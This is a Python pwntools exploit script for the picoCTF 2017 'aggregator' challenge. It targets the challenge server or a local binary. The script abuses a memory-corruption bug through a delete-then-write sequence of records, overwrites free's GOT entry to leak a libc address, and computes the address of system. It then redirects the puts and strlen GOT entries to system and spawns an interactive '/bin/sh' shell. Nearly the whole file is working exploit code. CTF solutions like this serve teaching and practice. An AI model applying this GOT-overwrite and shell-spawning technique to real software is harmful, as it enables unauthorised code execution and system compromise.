#!/usr/bin/env python
#
# @author GuilT

from pwn import *
import sys

if len(sys.argv) > 1:
    conn = remote('shell2017.picoctf.com',61887)
else:
    conn = process('./aggregator')
    #gdb.attach(conn, 'b* db_aggregate_month+54\nb* 0x400fd2')
    
    
elf = ELF('./aggregator')


def addcomment(comment):
    payload = '#' + comment
    log.info('sending: %r' % payload)
    conn.sendline(payload)
    
def deleteDay(day, month, year):
    payload = '~%02d-%02d-%04d' %(day, month, year)
    log.info('sending: %r' % payload)
    conn.sendline(payload)
    
def aggregate(func, month, year):
    payload = 'a%c %02d-%04d' %(func, month, year)
    log.info('sending: %r' % payload)
    conn.sendline(payload)
    return conn.read()
    
def sendval(day, month, year, val):
    payload = '%02d-%02d-%04d %ld' %(day, month, year, val)
    log.info('sending: %r' % payload)
    conn.sendline(payload)
      
sendval(1,10,100,123)
deleteDay(1,10,100)
conn.sendline(p64(0x601EF0))            # free.got
sendval(1,10,100,0x4007b6)              # replaces free.got with free.plt+6
print conn.readline()                   # eat garbage from stdin
freeaddr = int(aggregate('M',1,100))    # leak address of free from got
log.success('freeaddr @ 0x%x' % freeaddr)
systemaddr = freeaddr - 0x3b170
log.success('systemaddr @ 0x%x' % systemaddr)
sendval(1,10,100,systemaddr)            # replaces puts.got with system
sendval(1,10,100,systemaddr)            # replaces strlen.got with system
conn.sendline('/bin/sh -i\x00')         # strlen (now system) is the first thing called on input...
conn.interactive(0)